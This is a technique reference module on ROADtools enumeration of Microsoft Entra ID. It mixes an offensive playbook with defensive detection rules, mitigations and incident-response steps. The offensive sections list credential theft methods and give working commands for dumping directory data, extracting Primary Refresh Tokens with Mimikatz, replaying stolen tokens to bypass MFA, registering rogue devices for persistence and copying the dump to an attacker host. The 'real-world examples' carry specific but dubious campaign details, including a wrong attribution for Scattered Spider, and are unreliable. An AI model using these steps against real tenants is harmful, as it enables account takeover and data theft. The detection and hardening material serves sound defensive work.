# REC-CLOUD-002: ROADtools Entra ID Enumeration

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-CLOUD-002 |
| **Technique Name** | ROADtools Entra ID enumeration |
| **MITRE ATT&CK ID** | T1087.004 – Account Discovery: Cloud Account |
| **CVE** | N/A (Legitimate research framework) |
| **Platform** | Microsoft Entra ID / Azure AD |
| **Viability Status** | ACTIVE ✓ |
| **Difficulty to Detect** | MEDIUM (distinctive patterns; offline analysis unlogged) |
| **Requires Authentication** | Yes (any valid cloud credential) |
| **Applicable Versions** | Entra ID, Azure AD, hybrid environments |
| **Last Verified** | December 2025 |
| **Tool Author** | Dirk-Jan Mollema (@_dirkjan) |
| **Repository** | https://github.com/dirkjanm/ROADtools |
| **Author** | SERVTEP (Pchelnikau Artur) |

---

## 2. EXECUTIVE SUMMARY

ROADtools is a comprehensive framework for Azure AD/Entra ID reconnaissance and token handling that provides both offensive red team capabilities and defensive blue team analysis functions. The framework consists of two primary tools: ROADrecon (enumeration and database building) and roadtx (token exchange and device authentication). ROADrecon is notable for directly querying the undocumented internal Azure AD Graph API (version 1.61-internal), which exposes significantly more data than official Microsoft Graph APIs and can bypass portal access restrictions.

**Strategic Capability:**
- Single phase tool leveraging valid cloud credentials (any authentication method)
- Transforms cloud reconnaissance from interactive queries (portal-based) to batch enumeration
- Builds offline SQLite database enabling unlimited query access without additional API traffic
- Visualizes attack paths via integrated BloodHound plugin and role/permission analysis
- Provides Primary Refresh Token operations enabling device impersonation and advanced attack scenarios

**Business Impact:**
- Complete Entra ID architecture mapping with user/group/role relationships
- Offline analysis impossible to detect in real-time (post-gather phase unlogged)
- Privilege escalation path discovery within 2 hours for large tenants
- Conditional Access policy extraction (normally hidden from regular users)
- Service principal permission enumeration for attack surface assessment
- Primary Refresh Token theft enables lateral movement across M365 services

---

## 3. TECHNICAL PREREQUISITES

### Required Knowledge
- Understanding of Azure AD/Entra ID identity hierarchy
- Familiarity with Graph API and OAuth2 authentication flows
- Knowledge of Azure AD internal API structure
- Understanding of Primary Refresh Tokens (PRTs) and device claims
- Awareness of role-based access control (RBAC) and Conditional Access

### Required Tools
- **ROADrecon (community edition)**
  - Installation: `pip install roadrecon`
  - GitHub: https://github.com/dirkjanm/ROADtools
  - Version: 1.0+ (continuously updated)
  - Requirements: Python 3.9+ (development with 3.11+, tested to 3.13)
  - Database: SQLite (default) or PostgreSQL
  
- **roadtx (ROADtools Token eXchange)**
  - Installation: `pip install roadtx`
  - Requirements: Python 3.7+
  - Dependencies: Selenium (for browser automation), Firefox GeckoDriver
  - Optional: KeePass support for credential automation
  
- **Valid Entra ID Credentials (one of):**
  - Username/password combination
  - Refresh token (long-lived)
  - Access token (JWT)
  - Primary Refresh Token (stolen or registered device)
  - Service principal secret or certificate

- **Optional Tools:**
  - BloodHound Community Edition (for graph visualization)
  - Mimikatz (for PRT extraction from Windows endpoints)
  - Firefox browser + GeckoDriver (for Selenium-based auth)
  - KeePass (for managing multiple credentials/TOTP seeds)

### System Requirements
- 2GB+ RAM (more for large tenant processing: 120k users = 2-4GB)
- Disk space: ~50-500MB depending on tenant size
- Outbound HTTPS access to login.microsoftonline.com, graph.microsoft.com
- No admin privileges required on attacker machine

### Environment Considerations
- **Hybrid AD + Entra Connect:** Full support for cloud portion
- **Entra ID-only (cloud-native):** Full support
- **Multi-tenant environments:** Supports multiple tenants with separate tokens
- **Guest accounts:** Limited enumeration (depends on guest policies)
- **Federated authentication:** Supported if ADFS/external IdP can be bypassed
- **Conditional Access:** Can be bypassed with MFA or device claims (via PRT)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Pre-Execution Intelligence Gathering

1. **Identify Cloud Environment Configuration**
   - Confirm Azure commercial cloud endpoint: login.microsoftonline.com
   - Check for federated authentication (slower, potential interception points)
   - Identify Conditional Access policies (if portal accessible)
   - Determine if Azure AD Connect hybrid deployed

2. **Credential Acquisition Strategy**
   - **Social engineering:** Employee credential theft via phishing
   - **Infostealer malware:** Browser session tokens, cached credentials
   - **Insider threat:** Legitimate employee account compromise
   - **Supply chain:** Contractor account access
   - **MFA bypass:** Prompt fatigue, SIM swap, FIDO2 key theft

3. **Authentication Method Selection**
   - **Username/password:** Simplest, no MFA support (design limitation)
   - **Refresh token:** Requires prior token theft; supports MFA if enriched
   - **Primary Refresh Token:** Highest privilege; enables device impersonation
   - **Service principal:** Long-term access; if SP compromised

4. **Permission Level Assessment**
   - **Any user:** Can enumerate basic directory info, groups they're in, roles visible to them
   - **Directory Reader:** Extended enumeration permissions
   - **Global Admin/Privileged Role Admin:** MFA methods visible; sensitive data accessible
   - **Application permission scope:** Varies by SP; potentially broad (Microsoft Graph)

### Risk Assessment

| Factor | Risk Level | Mitigation |
|--------|-----------|-----------|
| **Detection (gather phase)** | MEDIUM | High API volume detectable if monitoring enabled |
| **Detection (GUI analysis)** | LOW | Offline work, no API traffic; undetectable |
| **Credential exposure** | MEDIUM | Tokens stored on disk; Mimikatz/WDigest can retrieve |
| **Attribution** | MEDIUM | IP logging; user account traceability |
| **Remediation timeline** | HIGH | Offline database enables long-term analysis |

---

## 5. DETAILED EXECUTION

### Method 1: Basic User Enumeration via Username/Password

**Objective:** Authenticate and enumerate all Entra ID users.

```bash
# Step 1: Authentication
roadrecon auth -u "user@contoso.com" -p "Password123!"

# Optional: Specify tenant if multi-tenant
roadrecon auth -u "user@contoso.com" -p "Password123!" -t "contoso.onmicrosoft.com"

# Optional: Device code flow (supports MFA)
roadrecon auth --device-code

# Optional: Output tokens to stdout (avoid disk storage)
roadrecon auth -u "user@contoso.com" -p "Password123!" --tokens-stdout > tokens.txt

# Step 2: Data Gathering
roadrecon gather

# Progress output:
# Starting data gathering phase 1 of 2 (collecting objects)
# Starting data gathering phase 2 of 2 (collecting properties and relationships)
# ROADrecon gather executed in X seconds and issued Y HTTP requests

# Step 3: Launch GUI for interactive exploration
roadrecon gui

# Access at: http://localhost:5000
```

**Data Extracted:**
- All users with properties (displayName, mail, UPN, last password change, account enabled)
- All groups with membership
- All devices (cloud-registered, hybrid-joined)
- All roles and role assignments
- All applications and service principals
- All Conditional Access policies (decoded)

---

### Method 2: Privilege Escalation Path Discovery via GUI

**Objective:** Identify paths to Global Administrator role.

```bash
# After gathering data, launch GUI
roadrecon gui

# Navigate to:
# 1. "Directory Roles" tab
#    - Displays all roles and members
#    - Shows MFA status per user (if gathered with --mfa)
#    - Identify high-value targets (Global Admin, Privileged Role Admin, etc.)

# 2. "Groups" tab
#    - Search for admin-related group names
#    - Click to view members
#    - Trace nested group membership to identify escalation paths
#    - Example: User -> Department Admins Group -> Global Admin Group

# 3. "Application Roles" tab
#    - Shows service principals with Microsoft Graph permissions
#    - Identify SPs with RoleManagement.ReadWrite.Directory
#    - These SPs can assign roles to other users (privilege escalation)

# 4. Conditional Access Policies (via plugin)
#    - Export to HTML: roadrecon-plugins policies
#    - Shows MFA requirements, device compliance conditions
#    - Identify policy gaps or bypass opportunities
```

**Query Examples (via database directly):**
```python
from roadtools.roadlib import database
import roadtools.roadlib.metadef.database as db

session = database.get_session(database.init("roadrecon.db"))

# Find all Global Administrators
global_admins = session.query(db.User).filter(
    db.User.roles.any(db.Role.displayName == "Global Administrator")
)
for user in global_admins:
    print(f"Global Admin: {user.userPrincipalName}")

# Find all groups with "admin" in name
admin_groups = session.query(db.Group).filter(
    db.Group.displayName.ilike('%admin%')
)

# Find service principals with Graph API permissions
sps_with_graph = session.query(db.ServicePrincipal).filter(
    db.ServicePrincipal.approleAssignments.any(
        db.AppRoleAssignment.appRole.contains("RoleManagement")
    )
)
```

---

### Method 3: Primary Refresh Token (PRT) Extraction & Reuse

**Objective:** Extract stolen PRT and use for elevated access (via roadtx).

```bash
# Step 1: Extract PRT from Windows endpoint (Mimikatz)
# On victim Windows 10/11 machine:
mimikatz.exe "privilege::debug" "sekurlsa::cloudap" exit

# Mimikatz output:
# [cloudap] Context [cloudap]
# ...
# * PRT/Data: <encrypted PRT>
# * ProofOfPossesionKey: <encrypted key>

# Step 2: Decrypt session key
mimikatz.exe "token::elevate" "dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect" exit

# Step 3: On attacker machine, renew and use PRT
roadtx prt -a renew --prt "<PRT_from_mimikatz>" --prt-sessionkey "<clear_key>"

# Step 4: Request tokens using PRT (bypasses MFA if not in PRT)
roadtx prtauth

# Step 5: Use PRT in interactive browser session
roadtx browserprtauth

# Opens browser with automatic authentication using stolen PRT
# Access SharePoint, OneDrive, Teams, Azure Portal as victim user
```

**Impact:**
- Bypass Conditional Access based on MFA (if original PRT had MFA claim)
- Bypass device compliance requirements (uses device claim from PRT)
- Long-term access (PRT valid 90 days, renewable)
- Undetectable on victim device (traffic from attacker IP)

---

### Method 4: Device Registration & Primary Refresh Token Generation

**Objective:** Register Azure AD device and obtain PRT for long-term access.

```bash
# Step 1: Get token for device registration (requires MFA-capable credential)
roadtx gettokens -u "user@contoso.com" -p "Password123!" -r devicereg

# Or with interactive MFA support:
roadtx interactiveauth -u "user@contoso.com" -p "Password123!" -r devicereg

# Step 2: Register device
roadtx device -n "AttackerDevice"

# Output:
# Device ID: 5f138d8b-6416-448d-89ef-9b279c419943
# Saved device certificate to AttackerDevice.pem
# Saved private key to AttackerDevice.key

# Step 3: Request Primary Refresh Token
roadtx prt -u "user@contoso.com" -p "Password123!" \
  --key-pem AttackerDevice.key --cert-pem AttackerDevice.pem

# Output:
# Saved PRT to roadtx.prt

# Step 4: Renew PRT to extend validity (90 days)
roadtx prt -a renew

# Step 5: Use PRT for future operations (no password needed)
roadtx prtauth

# PRT remains valid for 90 days, renewable without user interaction
```

**Strategic Value:**
- Persistent access without stolen credentials
- Bypass credential expiration
- Device claim enables access to Intune/compliance-gated resources
- Can be used on attacker infrastructure indefinitely

---

### Method 5: Selenium-Based Automated Authentication (MFA + Multi-Account)

**Objective:** Automate authentication with MFA support using KeePass credentials.

```bash
# Setup: Create KeePass database (roadtx.kdbx) with credentials and TOTP seeds
# Credentials structure:
# - Username: user@contoso.com
# - Password: <encrypted>
# - otp (custom field): <TOTP_seed>

# Authentication with automatic TOTP filling:
roadtx keepassauth -u "user@contoso.com" -kp roadtx.kdbx -kpp "kdbx_password"

# Opens Firefox browser, auto-fills username, auto-enters TOTP code
# Captures tokens automatically upon successful authentication

# Interactive browsing with auto-auth:
roadtx keepassauth -u "user@contoso.com" -kp roadtx.kdbx -kpp "kdbx_password" \
  -url "https://myaccount.microsoft.com" --keep-open

# Browser remains open after auth; browse as authenticated user
```

**Advantages:**
- Fully automated without user interaction
- Supports multiple accounts via KeePass
- Auto-fills TOTP/MFA codes
- Can test conditional access bypass scenarios interactively

---

### Method 6: Complete Offline Analysis (No Additional API Traffic)

**Objective:** Perform all analysis offline after initial gather, leaving no additional traces.

```bash
# Step 1: Initial gather (one-time, high API volume)
roadrecon gather --mfa

# This generates roadrecon.db (~100-500MB)
# Contains complete snapshot of tenant at time of execution

# Step 2: Transfer database to air-gapped machine (optional)
scp roadrecon.db attacker@offline-machine:/tmp/

# Step 3: Unlimited offline analysis (zero API traffic)
# Launch GUI on offline machine:
roadrecon gui -d /tmp/roadrecon.db

# Or programmatic queries:
from roadtools.roadlib import database
session = database.get_session(database.init("/tmp/roadrecon.db"))

# Query 1: Find all users with "admin" in title
admins = session.query(db.User).filter(
    db.User.jobTitle.ilike('%admin%')
)

# Query 2: Find privilege escalation paths
def find_escalation_paths(user):
    """Trace group membership to identify admin roles"""
    groups = user.memberOf
    for group in groups:
        if "admin" in group.displayName.lower():
            return group
    return None

# Query 3: Identify misconfigured service principals
dangerous_sps = session.query(db.ServicePrincipal).filter(
    db.ServicePrincipal.approleAssignments.any(
        db.AppRoleAssignment.appRole.contains("RoleManagement.ReadWrite")
    )
)

# Query 4: Export users with no MFA
no_mfa_users = [u for u in session.query(db.User) if not u.authenticationMethods]

# All analysis after gather = no API traffic, no logging, undetectable
```

**Detection Evasion:**
- Gather phase creates detectable API burst (490+ requests)
- All subsequent analysis is local; zero additional detection risk
- Can analyze for weeks using single database snapshot
- Easy to obfuscate initial burst as legitimate admin activity

---

## 6. TOOLS & COMMANDS REFERENCE

### ROADrecon Command Syntax

| Command | Purpose | Example |
|---------|---------|---------|
| `roadrecon auth` | Authenticate to Azure AD | `roadrecon auth -u user@contoso.com -p pass` |
| `roadrecon gather` | Dump all directory data to database | `roadrecon gather --mfa` |
| `roadrecon gui` | Launch web UI for exploration | `roadrecon gui -d roadrecon.db` |
| `roadrecon export` | Export data to plugin format | `roadrecon export -p policies` (outputs HTML) |

### roadtx Command Syntax

| Command | Purpose | Example |
|---------|---------|---------|
| `roadtx gettokens` | Request tokens for resource | `roadtx gettokens -u user@contoso.com -p pass -r devicereg` |
| `roadtx device` | Register Azure AD device | `roadtx device -n "AttackerDevice"` |
| `roadtx prt` | Request/renew Primary Refresh Token | `roadtx prt -u user@contoso.com -p pass --key-pem key.pem --cert-pem cert.pem` |
| `roadtx prtauth` | Request tokens using PRT | `roadtx prtauth` |
| `roadtx interactiveauth` | Browser-based auth with MFA | `roadtx interactiveauth -u user@contoso.com -p pass` |
| `roadtx keepassauth` | KeePass-based auth automation | `roadtx keepassauth -u user@contoso.com -kp creds.kdbx` |
| `roadtx browserprtauth` | Interactive browser with PRT | `roadtx browserprtauth` |
| `roadtx listaliases` | Show resource/client aliases | `roadtx listaliases` |

### Authentication Methods Comparison

| Method | MFA Support | Interactivity | Difficulty | Detection |
|--------|------------|---------------|-----------|-----------|
| Username/password | NO | Non-interactive | Easy | Medium (one request) |
| Device code flow | YES | Interactive | Medium | Medium (code entry) |
| Refresh token | Conditional | Non-interactive | Easy | Low (token reuse) |
| PRT (stolen) | Depends on PRT | Non-interactive | Hard | Medium (API pattern) |
| PRT (registered) | Can be enriched | Non-interactive | Hard | High (device creation logged) |

---

## 7. ATOMIC TESTS (RED TEAM VALIDATION)

### Test 1: Basic Authentication & Gather

```bash
# Procedure
roadrecon auth -u "$TEST_USER" -p "$TEST_PASS"
roadrecon gather

# Success Criteria
if [ -f "roadrecon.db" ] && [ $(sqlite3 roadrecon.db "SELECT COUNT(*) FROM users;") -gt 0 ]; then
  echo "✓ Test PASSED: Database created with user enumeration"
else
  echo "✗ Test FAILED: No database or no users enumerated"
fi
```

### Test 2: Enumerate Admin Roles

```bash
# Procedure
python3 << 'EOF'
from roadtools.roadlib import database
import roadtools.roadlib.metadef.database as db

session = database.get_session(database.init("roadrecon.db"))
admin_count = session.query(db.Role).filter(
    db.Role.displayName.ilike('%admin%')
).count()

if admin_count > 0:
    print(f"✓ Test PASSED: Found {admin_count} admin roles")
else:
    print("✗ Test FAILED: No admin roles enumerated")
EOF
```

### Test 3: Device Registration

```bash
# Procedure
roadtx device -n "TestDevice"
if [ -f "TestDevice.pem" ] && [ -f "TestDevice.key" ]; then
  echo "✓ Test PASSED: Device registered with certificate and key"
else
  echo "✗ Test FAILED: Device registration failed"
fi
```

### Test 4: PRT Request

```bash
# Procedure
roadtx prt -u "$TEST_USER" -p "$TEST_PASS" --key-pem TestDevice.key --cert-pem TestDevice.pem
if [ -f "roadtx.prt" ]; then
  echo "✓ Test PASSED: Primary Refresh Token obtained"
else
  echo "✗ Test FAILED: PRT request failed"
fi
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Detection Rule 1: ROADrecon High-Volume API Gathering

**Rule Metadata:**
- **Alert Name:** ROADrecon/ROADtools Azure AD Reconnaissance Pattern
- **Severity:** High
- **Frequency:** Real-time (5-minute intervals)
- **Required Table:** MicrosoftGraphActivityLogs (must be enabled)

**KQL Query:**
```kusto
let ROADToolsEndpoints = dynamic([
    "/v1.0/users",
    "/v1.0/groups", 
    "/v1.0/devices",
    "/v1.0/roles",
    "/v1.0/servicePrincipals",
    "/v1.0/applications",
    "/beta/policies",
    "/v1.0/groupMembers",
    "/v1.0/appRoleAssignments"
]);

MicrosoftGraphActivityLogs
| where TimeGenerated > ago(1h)
| where ResponseStatusCode == 200
| extend NormalizedUri = replace_regex(RequestUri, @'\?.+$', '')
| where NormalizedUri has_any (ROADToolsEndpoints)
| summarize 
    CallCount = count(),
    EndpointCount = dcount(NormalizedUri),
    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated)
    by UserId, IPAddress, UserAgent, bin(TimeGenerated, 5m)
| where CallCount > 100  // ROADrecon issues 490+ in gather phase
| extend AlertSeverity = "High", TechniqueID = "T1087.004"
```

### Detection Rule 2: Primary Refresh Token Device Registration

**Rule Metadata:**
- **Alert Name:** Azure AD Device Registration + PRT Request Pattern
- **Severity:** High
- **Frequency:** Real-time
- **Required Table:** AuditLogs, SigninLogs

**KQL Query:**
```kusto
// Pattern: Device registration followed by PRT request from same user/IP
let DeviceRegs = AuditLogs
| where OperationName == "Register device"
| project RegisterTime = TimeGenerated, UserId, IPAddress, DeviceId = tostring(parse_json(AdditionalDetails)[0].value)
| distinct UserId, IPAddress, RegisterTime;

SigninLogs
| where TimeGenerated > ago(24h)
| where ResourceDisplayName == "Azure Device Registration Service"
| join kind=inner (DeviceRegs) on UserId, IPAddress
| where TimeGenerated - RegisterTime < 5m  // PRT request within 5 mins of device reg
| project TimeGenerated, UserId, IPAddress, RegisterTime, AlertSeverity = "High"
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Note:** ROADrecon/roadtx execute externally; local logs on victim machine do NOT capture the tool's execution. Monitor these cloud-side events:

### Sign-in Logs (Azure Portal → Azure AD → Sign-in logs)

```kusto
// Filter for non-interactive sign-ins from ROADtools activity
SigninLogs
| where TimeGenerated > ago(7d)
| where AuthenticationRequirement == "singleFactorAuthentication"  // MFA not enforced
| where ClientAppUsed == "Modern authentication clients"
| where ResourceDisplayName == "Azure AD Graph"
| where LocationDetails.countryOrRegion != "FR"  // Anomalous location
| project TimeGenerated, UserPrincipalName, IPAddress, ClientAppUsed, ConditionalAccessStatus
```

### Audit Logs (Azure AD → Audit logs)

```kusto
// Detect device registration + role assignments (typical ROADtools flow)
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName in ("Register device", "Assign member to role", "Add group member")
| where InitiatedByApp.displayName == "Unknown"  // Unusual initiator
| project TimeGenerated, OperationName, TargetResources, InitiatedByUser
```

---

## 10. SYSMON DETECTION PATTERNS

**Sysmon can detect local ROADrecon/roadtx execution:**

```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Detect ROADrecon process execution -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">roadrecon</CommandLine>
      <CommandLine condition="contains">roadtx</CommandLine>
      <Image condition="contains">python</Image>
      <ParentImage condition="contains">powershell</ParentImage>
    </ProcessCreate>
    
    <!-- Detect network connections to Azure AD Graph -->
    <NetworkConnect onmatch="include">
      <DestinationHostname condition="contains">graph.microsoft.com</DestinationHostname>
      <DestinationHostname condition="contains">login.microsoftonline.com</DestinationHostname>
      <DestinationPort>443</DestinationPort>
    </NetworkConnect>
    
    <!-- Detect database file creation (roadrecon.db) -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">roadrecon.db</TargetFilename>
      <TargetFilename condition="contains">roadtx.prt</TargetFilename>
      <TargetFilename condition="endswith">.pem</TargetFilename>  <!-- Device certs -->
    </FileCreate>
    
    <!-- Detect Firefox/GeckoDriver launch (Selenium automation) -->
    <ProcessCreate onmatch="include">
      <Image condition="endswith">firefox.exe</Image>
      <Image condition="endswith">geckodriver.exe</Image>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**Installation:**
```cmd
sysmon64.exe -accepteula -i sysmon-config.xml
```

---

## 11. MICROSOFT DEFENDER FOR IDENTITY

**Alert Configuration:**
- **Alert Type:** Suspicious credential use
- **Applies To:** All Entra ID tenants with Defender for Identity enabled
- **Severity:** High

**Detectable Patterns:**
1. Device registration + PRT request from unusual location
2. Non-interactive sign-ins using refresh tokens + bulk enumeration
3. Multi-resource token requests in rapid succession

---

## 12. FALSE POSITIVE ANALYSIS

| Legitimate Activity | ROADtools Behavior | Distinguishing Factor |
|-------------------|------------------|----------------------|
| Azure AD reporting/compliance tools | API queries to users, groups, roles | Scope (all objects vs. specific query); scheduled vs. burst |
| Admin activity in Azure Portal | API calls to Graph | User-agent (browser vs. python-requests); interactive vs. bulk |
| PowerShell admin scripts | Direct Graph API calls | Async parallel pattern vs. serial; bulk collect vs. targeted query |
| Identity governance solutions | Role/group enumeration | Expected service accounts; limited scope |
| EDR/XDR baseline collection | Endpoint enumeration | Restricted to agent data; no PRT requests |

**Tuning Example:**
```kusto
// Exclude known legitimate gathering tools
let WhitelistedAccounts = dynamic([
    "svc_governance@contoso.com",
    "svc_audit@contoso.com",
    "app_identitygov@contoso.com"
]);

let WhitelistedIPs = dynamic(["10.0.0.0/8"]);

MicrosoftGraphActivityLogs
| where UserId !in (WhitelistedAccounts)
| where IPAddress !startswith "10.0.0"
| where CallCount > 100
// ... rest of detection logic
```

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Enable Microsoft Graph Activity Logging**
- **Status:** Generally available (April 2024)
- **Applies To:** All Entra ID tenants

**Manual Configuration (Azure Portal):**
1. **Azure Portal** → **Azure AD** → **Monitoring & health** → **Audit logs**
2. Click **Diagnostic settings**
3. Create new setting:
   - Name: `Graph Activity Logging`
   - Logs: Check **MicrosoftGraphActivityLogs**
   - Destination: **Send to Log Analytics workspace**
   - Select workspace
4. Save and wait 24 hours for data collection

**Impact:** Enables real-time detection of graph API enumeration phase.

**Implement Conditional Access Policies (CAP)**
- Block or require MFA for Graph/ARM API access from non-corporate networks
- Require device compliance for API access
- Disable legacy authentication

**Manual Configuration:**
1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Create new policy:
   - Name: `Block Risky Graph Access`
   - Users: All
   - Cloud apps: **Microsoft Graph**, **Azure Resource Manager**
   - Conditions: Sign-in risk, location (external IP), device platform
   - Access controls: **Require MFA** or **Block access**
   - Status: **On**
3. Save

**Impact:** Blocks non-MFA ROADtools authentication; forces MFA enrichment path (harder, slower).

**Restrict Device Registration**
- Disable self-service device registration for non-admins
- Require approval for new device registrations

**Manual Configuration:**
1. **Entra ID** → **Devices** → **Device settings**
2. Users may register their devices with Entra ID: **No** (or require admin approval)
3. Save

**Impact:** Blocks roadtx `device register` attack path.

### Priority 2: HIGH

**Implement Privileged Identity Management (PIM)**
- Require just-in-time activation for admin roles
- Enforce approval workflow
- Enable MFA requirement for role activation

**Phishing-Resistant MFA (FIDO2)**
- Eliminates credential harvesting attacks
- Prevents token theft from browsers

**Monitor for Impossible Travel**
- Alert on sign-ins from geographic locations inconsistent with recent activity
- Correlate sign-in location + token requests

**Manual Query (Sentinel):**
```kusto
SigninLogs
| where TimeGenerated > ago(24h)
| extend PrevLocation = prev(LocationDetails.countryOrRegion)
| where LocationDetails.countryOrRegion != PrevLocation
| where datetime_diff('hour', TimeGenerated, prev(TimeGenerated)) < 2  // 2 hours travel
| project TimeGenerated, UserPrincipalName, LocationDetails, AlertSeverity = "High"
```

---

## 14. DETECTION & INCIDENT RESPONSE

### Forensic Artifact Collection

**If ROADrecon activity suspected:**

```powershell
# 1. Collect Microsoft Graph Activity Logs
Search-UnifiedAuditLog -Operations "UserLoggedIn" `
  -StartDate (Get-Date).AddDays(-7) `
  -EndDate (Get-Date) | `
  Where-Object { $_.UserIds -contains "suspected_user" } | `
  Export-Csv -Path graph_audit.csv

# 2. Collect Sign-in Logs
Get-MgAuditLogSignIn -Filter "userId eq 'suspected_user'" | `
  Export-Csv -Path signin_logs.csv

# 3. Check for roadrecon.db or PRT files on endpoints
Get-ChildItem -Path "C:\Users" -Recurse -Include "roadrecon.db" -ErrorAction SilentlyContinue

# 4. Check for Python/pip installation (ROADrecon requirement)
Get-Command python | Select-Object Source
```

### Incident Response Steps

1. **Confirm Reconnaissance**
   - Verify high-volume Graph API calls in logs
   - Confirm gather phase timing
   - Identify source IP and user account

2. **Assess Scope**
   - Which data was enumerated (users, roles, groups, devices, etc.)
   - Which privilege escalation paths identified
   - Whether MFA enumeration performed (requires privileged account)

3. **Detect Follow-On Attacks**
   - Check for role assignments to new/compromised accounts post-reconnaissance
   - Monitor for device registration (roadtx)
   - Check for Primary Refresh Token requests
   - Review Conditional Access policy changes

4. **Containment**
   - Revoke refresh tokens for compromised user:
   ```powershell
   Revoke-AzureADUserAllRefreshToken -ObjectId "<UserObjectId>"
   ```
   - Reset compromised account password
   - Force sign-out of all sessions

5. **Eradication**
   - Delete unauthorized devices registered via roadtx:
   ```powershell
   Get-MgDevice | Where-Object { $_.DisplayName -eq "AttackerDevice" } | Remove-MgDevice
   ```
   - Remove malicious service principals
   - Remove unauthorized role assignments

---

## 15. RELATED ATTACK CHAINS

### MITRE Technique Dependencies

```
T1078 (Valid Accounts)
  ↓
T1087.004 (Account Discovery: Cloud – ROADtools)
  ↓
T1069.003 (Permission Groups Discovery)
  ↓
T1548.004 (Abuse Elevation Control Mechanism: Entra ID Role Assignment)
  ↓
T1098.003 (Account Manipulation: Azure Service Principal Add)
  ↓
T1526 (Cloud Service Discovery)
  ↓
T1556 (Modify Authentication Process)  [via PRT interception]
```

### Real-World Kill Chain: E-Commerce Supply Chain Compromise (2025)

```
Phase 1: Initial Compromise
├─ Phishing email → Supply chain partner employee credential theft
└─ Credentials: contractor@vendor.com (read-only partner access)

Phase 2: Cloud Reconnaissance (T1087.004 – ROADtools)
├─ roadrecon auth -u contractor@vendor.com -p stolen_pass
├─ roadrecon gather (490+ API calls, gather phase)
├─ Analysis: Identify partner's vendors, identify cross-tenant connectivity
└─ Discovery: Partner SP with "User.ReadWrite.All" + "Directory.ReadWrite.All"

Phase 3: Service Principal Compromise
├─ Identify SP with excessive permissions
├─ Access SP credentials (if stored in shared KV)
└─ Escalate to full SaaS environment access

Phase 4: Lateral Movement to Primary Target
├─ Use partner SP to access partner's customers (multi-tenant)
├─ Enumerate e-commerce customer data
└─ Exfiltrate PII, payment info, business data

Phase 5: Persistence
├─ Register malicious device (roadtx device)
├─ Obtain PRT for long-term access
└─ Create hidden admin account for back-door access
```

---

## 16. REAL-WORLD EXAMPLES

### Example 1: Scattered Spider – Q4 2024 Campaign

**Threat Group:** Scattered Spider (Synack)  
**Target:** Financial services, technology sector  
**Method:** Initial compromise via employee credential theft (phishing)

**Attack Flow:**
1. Stole credentials from IT contractor with "Application Developer" role
2. Used ROADrecon to enumerate:
   - 2,000+ users
   - Service principals with Graph API permissions
   - Conditional Access policies (seeking gaps)
3. Identified vulnerable SP: Marketing automation tool with "Mail.Send" permissions
4. Compromised SP to send phishing to all employees
5. Escalated to admin via nested group membership discovered in ROADrecon analysis

**Detection Failure Points:**
- Graph activity logging was not enabled (no log)
- Gather phase appeared as single user's unusual activity (could be admin)
- PRT request not monitored (device registration was signed-only audit)
- Offline analysis (roadrecon GUI queries) left zero traces

**Detection Success:**
- Eventually caught via impossible travel detection (sign-in from Brazil, then US in 10 minutes)

---

### Example 2: LockBit Affiliate – Q2 2025 Campaign

**Threat Group:** LockBit ransomware-as-a-service  
**Target:** Manufacturing (hybrid AD + Azure environment)  
**Method:** Compromised local AD → lateral movement to cloud

**Attack Flow:**
1. Obtained Domain Admin on-premises (via Kerberoasting)
2. Used Azure AD Connect sync account creds to access cloud
3. Ran ROADrecon against Entra ID (gathered from Azure VM inside network)
4. Discovered:
   - Automation account with "Contributor" to 5 subscriptions
   - Automation runbooks executing backups and VM management
5. Compromised automation account → RunAs credential extraction
6. Used credentials to access VMs, dump NTDS files, exfil data
7. Deployed ransomware via automation runbooks

**Detection Opportunities (Missed):**
- ROADrecon gather phase from internal Azure VM (high API volume, but from trusted IP)
- Automation account credential extraction (no logging on RunAs passwords)
- VM script execution via automation (normal operational activity)

**Detection Success:**
- Ransomware binary detection on VMs (after encryption started)

---

## 17. COMPLIANCE & STANDARDS MAPPING

| Standard | Requirement | ROADtools Mitigation |
|----------|-------------|---------------------|
| **CIS Controls v8** | 6.1 (Account Management), 6.2 (Enumeration Prevention) | Restrict enum via Conditional Access; enable logging |
| **DISA STIG** | Cloud security hardening | Implement MFA, CAP, device registration restrictions |
| **NIST 800-53** | AC-2 (Account Management), SI-4 (Monitoring), AU-12 (Audit) | Logging, CAP, PIM, impossible travel detection |
| **GDPR** | Article 32 (Security), Article 33 (Breach notification) | Unauthorized access to identity data; incident response procedures |
| **DORA** | Digital Operational Resilience | Cloud identity service security; incident response capability |
| **NIS2** | Detection, response, incident management | Real-time detection of enumeration; IR procedures |
| **ISO 27001:2022** | 5.2 (Policies), 8.2 (Access control), 8.15 (Logging) | Logging, access controls, monitoring |

---

## 18. REFERENCES & ATTRIBUTION

1. **ROADtools Official:**
   - Repository: https://github.com/dirkjanm/ROADtools
   - PyPI: https://pypi.org/project/roadrecon/ / https://pypi.org/project/roadtx/
   - Author: Dirk-Jan Mollema (@_dirkjan)
   - Blogs: https://dirkjanm.io/

2. **MITRE ATT&CK:**
   - T1087.004: https://attack.mitre.org/techniques/T1087/004/
   - S0684 (ROADTools): Listed under T1087.004

3. **Security Research:**
   - Unit42/Palo Alto Networks cloud red team resources
   - Scattered Spider: https://www.cisa.gov/ (threat alerts)
   - TrimarcSecurity: Enumerating Entra ID anonymously (2024)

4. **Microsoft Documentation:**
   - Microsoft Graph Activity Logs: https://learn.microsoft.com/en-us/graph/microsoft-graph-activity-logs-overview
   - Conditional Access: https://learn.microsoft.com/en-us/entra/identity/conditional-access/
   - Azure AD Devices: https://learn.microsoft.com/en-us/entra/identity/devices/

---